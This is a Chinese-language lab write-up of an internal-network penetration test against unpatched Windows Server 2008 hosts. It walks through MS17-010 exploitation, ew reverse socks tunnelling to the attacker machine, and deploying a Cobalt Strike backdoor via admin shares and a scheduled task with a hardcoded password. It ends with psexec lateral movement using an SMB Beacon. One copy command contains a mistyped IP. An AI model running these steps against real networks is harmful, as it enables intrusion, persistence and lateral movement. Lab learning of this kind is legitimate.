![1633856939_6162adab573439394768c.png!small](https://image.3001.net/images/20211010/1633856939_6162adab573439394768c.png!small)

网络拓扑

因为是一次简单的内网渗透,以上靶机均为Windows Server2008,并且没有装任何的补丁,所以全都可以使用ms17_010(永恒之蓝)进行攻击

首先直接使用msf拿到了内网跳板(10.7.233.212)的shell,并且为最高权限,

然后对它进行信息收集,首先查看IP,查看内网的网段是多少 输入命令 **`ipconfig`**
进行查看,然后得知内网跳板的内网IP为(192.168.174.128),

然后为了方便操作,直接在meterpreter界面中输入命令 **`run getgui -e`** 一键开启靶机的3389端口

,然后再输入`arp -g`和`route print`对靶机进行信息收集,得到了靶机内网的另一台机子的IP地址为(192.168.174.129)
连接(192.168.174.128:3389);

CS生成了一个后缀为exe的后门,想用python -m
http.server将后门通过浏览器的方式传输到靶机中,但是发现靶机并不能访问到web服务器.只能通过msf创建的shell来上传.

将后门成功上传到靶机中,运行,CS上线了靶机  
![1633857005_6162aded1d6bca46916bd.png!small](https://image.3001.net/images/20211010/1633857005_6162aded1d6bca46916bd.png!small)然后进行对内网中的靶机进行渗透测试;首先想要想要进一步对内网进行渗透,那么就要配置代理服务,使得kali能够成功进入内网;

首先想到先用的代理方式是msf本身的代理方式,通过在跳板机中加入一条路由,然后切换到`auxiliary/server/socks_proxy`模块开启代理服务;

首先进入msf中内网跳板机(10.7.233.212&192.168.174.128)的meterpreter界面输入命令`run
post/multi/manage/autoroute`自动添加一条路由,然后将会话放入后台

,开启socks的代理服务(配置SRVHOST,SRVPORT,VERSION),然后配置`/etc/proxychains4.conf`文件,在文件的最后一行添加->`sock5
127.0.0.1 1234`,

然后调用proxychains来执行命令,但是一开始一直是用`proxychains
ping`去测试代理是否成功,但是后来才发现,ping命令根本就不能够使用

 **sock4a:TELNET,FTP,HTTP等TCP协议;**

 **sock5:TCP与UDP,并支持安全认证方案;**

这两种协议均不支持ping,因为ping是icmp;
因为一开始没发现,以为是代理没有成功,后面就换了ew来进行内网渗透,将Windows版本的ew上传至靶机,

切换到本机(攻击机->kali)输出命令`ew -s rcsocks -l 1080 -e
8888`将本地1080端口受到的代理转发至8888端口,然后切换到靶机上输入命令`ew -s rssocks -d 10.7.33.234 -e
8888`,

当本机ew界面弹出

![1633857393_6162af71ca24f316843f4.png!small](https://image.3001.net/images/20211010/1633857393_6162af71ca24f316843f4.png!small)

回显即为代理成功,因为可以使用ms17_010一路通关,就直接用代理开启msf然后继续对129进行渗透测试

使用命令`proxychains
msfconsole`开启msf,是使用了sock5代理的,当然也可以在cs中直接设置代理,然后在msf中直接设置全局变量使用代理,

然后继续进行下一步的渗透测试,继续使用ms17_010模块,去对下一台靶机进行渗透测试,但是发现怎么样都没有将shell弹出来,以为是msf中shell传不出来,于是改用CS,生成后门,然后上传另一台靶机,

使用计划执行的命令来触发木马,先将生成好的木马上传至已经获得shell的跳板机,然后使用命令

 **`copy C:\shell.exe \\192.16.174.129\C$```**
将名为shell.exe的后门上传至内网跳板二上,然后再使用命令

`schtasks /create /s 192.168.174.129 /u Administrator /p P@ssw0rd! /ru
"SYSTEM" /tn test /sc DALIY /st 14:10 /tr
C:\\windows\\temp\\shell.exe```创建一个名为test的计划任务,在每天的14:10执行shell.exe文件,但是CS并没有相应机器上线
后来才察觉到,这个是不出网机器的渗透;于是改变策略,在CS上创建一个监听器,使用的payload是Beacon
SMB,然后再CS中使用psexec进行横向移动,选择刚才创建的payload为Beacon
SMB的监听器,选择10.7.233.212的会话,然后开始横向移动,然后就会得到一个IP地址为192.168.174.128的会话->![1633857449_6162afa91ba1290c02605.png!small](https://image.3001.net/images/20211010/1633857449_6162afa91ba1290c02605.png!small)然后用这个会话生成一个监听器,选中中转模块的listenr,生成一个监听器,然后用监听器生成一个后门上传并允许就有一个新的会话。

